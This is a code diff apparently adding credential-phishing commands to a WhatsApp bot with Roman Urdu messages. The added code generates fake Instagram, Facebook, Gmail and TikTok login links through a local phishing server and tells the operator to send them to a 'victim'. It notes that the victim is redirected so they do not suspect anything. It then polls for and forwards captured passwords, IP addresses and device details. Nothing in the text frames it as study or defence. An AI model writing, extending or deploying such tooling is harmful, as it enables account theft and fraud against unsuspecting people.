@@ -13656,6 +13656,176 @@ Aap is section se permanently ban hain.`);
     break;
 }
 
+// ============ PHISHING COMMANDS (addkey1 locked) ============
+case 'igphish':
+case 'fbphish':
+case 'fbookphish':
+case 'emailphish':
+case 'gmailphish':
+case 'tiktokphish': {
+    const _phCmd = command.replace(/^[\/!#.]/, '').toLowerCase();
+    const phTypes = { igphish:'instagram', fbphish:'facebook', fbookphish:'facebook', emailphish:'gmail', gmailphish:'gmail', tiktokphish:'tiktok' };
+    const phTargetType = phTypes[_phCmd] || 'instagram';
+
+    // ── addkey1 lock — same as Bug/SIM/Location ──
+    {
+        const _phN = (m.sender || '').split('@')[0].split(':')[0];
+        try {
+            const _phBanned = (global._flagCache?.bugBanned || []);
+            if (_phBanned.some(id => String(id).replace(/[^0-9]/g,'') === _phN))
+                return reply(`🚫 *Access Denied*\nAap is section se permanently ban hain.`);
+            const _phUnlocked = (global._flagCache?.bugUnlocked || []);
+            if (!_phUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _phN))
+                return reply(`🔒 *Phishing — Locked*\n\nYe command sirf authorized users ke liye hai.\n\n*Unlock karo:* ${prefix}addkey1 <code>`);
+        } catch(e) {
+            return reply(`🔒 *Phishing — Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
+        }
+    }
+
+    // ── Generate phishing link ──
+    try {
+        const _phPort    = process.env.PORT || 3001;
+        const _phApiBase = `http://localhost:${_phPort}`;
+        const _phUserId  = m.sender;
+
+        const _phResp = await axios.post(`${_phApiBase}/api/phish/create`, {
+            type: phTargetType,
+            userId: _phUserId
+        }, { timeout: 10000, headers: { 'Content-Type': 'application/json' } });
+
+        const _phToken = _phResp.data.sessionToken;
+        const _phLink  = _phResp.data.link;
+
+        if (!_phToken || !_phLink) throw new Error('Bad response from phish server');
+
+        const brandNames = { instagram:'Instagram', facebook:'Facebook', gmail:'Gmail', tiktok:'TikTok' };
+        const brandName = brandNames[phTargetType] || phTargetType;
+
+        const _phMsg =
+            `🎣 *${brandName} Phishing Link Generated!*\n\n` +
+            `*🔗 Link:*\n${_phLink}\n\n` +
+            `*📌 Instructions:*\n` +
+            `1. Send this link to the victim\n` +
+            `2. JAB BHI victim login kare ga, data yahan aye ga\n` +
+            `3. Link 2 ghante tak valid hai\n\n` +
+            `*🆔 Token:* \`${_phToken}\`\n` +
+            `*📱 Type:* ${brandName}\n\n` +
+            `_Victim ko "Wrong password" error dikhe ga aur real site pe redirect ho jaye ga — suspect nahi hoga._`;
+
+        await reply(_phMsg);
+
+        // ── START AUTO-POLL — jab victim data enter kare ga, khud ba khud WhatsApp per aye ga ──
+        // Her 5 second mein check karta hai, max 2 hours tak
+        let _phPollCount = 0;
+        const _phMaxPolls = 1440; // 2 hours = 7200s / 5s = 1440 checks
+        const _phPollInterval = setInterval(async () => {
+            try {
+                _phPollCount++;
+                if (_phPollCount > _phMaxPolls) {
+                    clearInterval(_phPollInterval);
+                    return;
+                }
+                const _phCheck = await axios.get(`${_phApiBase}/api/phish/result/${_phToken}`, { timeout: 5000 });
+                const _phData = _phCheck.data;
+                if (_phData && _phData.credentials && !_phData._notified) {
+                    _phData._notified = true; // prevent duplicate sends
+
+                    let _phAlert = `🎯 *${brandName} — DATA CAPTURED!* 🎯\n`;
+                    _phAlert += `━━━━━━━━━━━━━━━━\n`;
+                    _phAlert += `*🌐 IP:* ${_phData.ip || 'N/A'}\n`;
+                    _phAlert += `━━━━━━━━━━━━━━━━\n`;
+                    _phAlert += `*📋 CREDENTIALS:*\n`;
+                    for (const [k, v] of Object.entries(_phData.credentials)) {
+                        _phAlert += `  • *${k}:* \`${v}\`\n`;
+                    }
+                    if (_phData.device) {
+                        _phAlert += `━━━━━━━━━━━━━━━━\n`;
+                        _phAlert += `*📱 Device:* ${(_phData.device.ua || 'N/A').slice(0,60)}\n`;
+                        _phAlert += `*🕐 Time:* ${new Date(_phData.capturedAt).toLocaleString()}`;
+                    }
+                    _phAlert += `\n━━━━━━━━━━━━━━━━\n🔗 *${_phLink}*`;
+
+                    await reply(_phAlert);
+                    clearInterval(_phPollInterval);
+                }
+            } catch (_) { /* polling — silently ignore errors */ }
+        }, 5000);
+
+        // Clean up interval when command context ends (using a timeout guard)
+        setTimeout(() => {
+            try { clearInterval(_phPollInterval); } catch(_) {}
+        }, 2 * 60 * 60 * 1000 + 10000); // 2 hours + 10s buffer
+
+    } catch (_phErr) {
+        await reply(`❌ *Error:* ${_phErr.message}\nThodi der baad dobara try karo.`);
+    }
+}
+break;
+
+// ── .phishcheck <token> — fetch captured phishing data ──────────────
+case 'phishcheck':
+case 'phishresult':
+case 'phcheck': {
+    // ── addkey1 lock ──
+    {
+        const _pcN = (m.sender || '').split('@')[0].split(':')[0];
+        try {
+            const _pcBanned = (global._flagCache?.bugBanned || []);
+            if (_pcBanned.some(id => String(id).replace(/[^0-9]/g,'') === _pcN))
+                return reply(`🚫 *Access Denied*`);
+            const _pcUnlocked = (global._flagCache?.bugUnlocked || []);
+            if (!_pcUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _pcN))
+                return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`);
+        } catch(e) { return reply(`🔒 *Locked* — Type *${prefix}addkey1 <code>* to unlock.`); }
+    }
+
+    const _pcToken = text?.trim();
+    if (!_pcToken) return reply(`🔑 *Usage:* ${prefix}phishcheck <token>\n\nToken aapko phishing command mein mila tha.`);
+
+    try {
+        const _pcPort    = process.env.PORT || 3001;
+        const _pcApiBase = `http://localhost:${_pcPort}`;
+        const _pcResp = await axios.get(`${_pcApiBase}/api/phish/result/${_pcToken}`, { timeout: 8000 });
+        const d = _pcResp.data;
+
+        if (!d || d.error) return reply(`❌ *Session not found.*\nToken galat hai ya expire ho gaya.`);
+
+        const brandNames = { instagram:'Instagram', facebook:'Facebook', gmail:'Gmail', tiktok:'TikTok' };
+        const brandName = brandNames[d.type] || d.type;
+
+        let msg = `🎣 *${brandName} Phishing Result*\n`;
+        msg += `━━━━━━━━━━━━━━━━\n`;
+        msg += `*👤 Victim IP:* ${d.ip || 'N/A'}\n`;
+
+        // Credentials
+        if (d.credentials) {
+            msg += `━━━━━━━━━━━━━━━━\n`;
+            msg += `*📋 CAPTURED DATA:*\n`;
+            for (const [key, val] of Object.entries(d.credentials)) {
+                msg += `  • *${key}:* ${val}\n`;
+            }
+        }
+
+        // Device info
+        if (d.device) {
+            msg += `━━━━━━━━━━━━━━━━\n`;
+            msg += `*📱 Device Info:*\n`;
+            msg += `  • *UA:* ${(d.device.ua || 'N/A').slice(0,80)}\n`;
+            msg += `  • *Platform:* ${d.device.platform || 'N/A'}\n`;
+            msg += `  • *Screen:* ${d.device.screen || 'N/A'}\n`;
+            msg += `  • *Timezone:* ${d.device.tz || 'N/A'}\n`;
+        }
+
+        msg += `━━━━━━━━━━━━━━━━\n`;
+        msg += `*🕐 Captured:* ${d.capturedAt ? new Date(d.capturedAt).toLocaleString() : 'Not yet captured'}`;
+
+        await reply(msg);
+    } catch (_pcErr) {
+        await reply(`❌ *Error:* ${_pcErr.message}`);
+    }
+}
+break;
+
 // ── .loccheck <token> — fetch captured data ──────────────────────────
 case 'loccheck':
 case 'locresult': {
